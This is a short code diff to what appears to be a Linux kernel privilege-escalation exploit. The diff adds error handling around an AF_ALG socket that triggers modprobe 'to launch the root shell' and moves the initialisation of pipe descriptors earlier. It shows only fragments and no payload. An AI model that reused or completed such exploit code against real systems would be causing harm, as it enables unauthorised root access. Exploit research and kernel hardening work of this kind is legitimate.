@@ -270,13 +270,20 @@ void trigger_modprobe_sock(void)
 
 	printf("[!] triggering modprobe using AF_ALG socket to launch the root shell...\n");
 	alg_fd = socket(AF_ALG, SOCK_SEQPACKET, 0);
-	bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa));
-	printf("[!] root shell is finished\n");
-
-	if (alg_fd >= 0) {
-		if (close(alg_fd) < 0)
-			perror("[-] close alg_fd");
+	if (alg_fd < 0) {
+		perror("[-] socket");
+		return;
 	}
+
+	if (bind(alg_fd, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
+		perror("[-] bind");
+		close(alg_fd);
+		return;
+	}
+
+	printf("[!] root shell is finished\n");
+	if (close(alg_fd) < 0)
+		perror("[-] close alg_fd");
 }
 
 int main(void)
@@ -295,6 +302,11 @@ int main(void)
 	char act_args[DRILL_ACT_SIZE] = { 0 };
 
 	printf("begin as: uid=%d, euid=%d\n", getuid(), geteuid());
+
+	for (i = 0; i < PIPES_N; i++) {
+		pipe_fds[i][0] = -1;
+		pipe_fds[i][1] = -1;
+	}
 
 	ret = increase_fd_limit();
 	if (ret == EXIT_FAILURE)
@@ -318,11 +330,6 @@ int main(void)
 
 	if (do_cpu_pinning(0) == EXIT_FAILURE)
 		goto end;
-
-	for (i = 0; i < PIPES_N; i++) {
-		pipe_fds[i][0] = -1;
-		pipe_fds[i][1] = -1;
-	}
 
 	pipe_data = malloc(PAGE_SIZE);
 	if (pipe_data == NULL) {
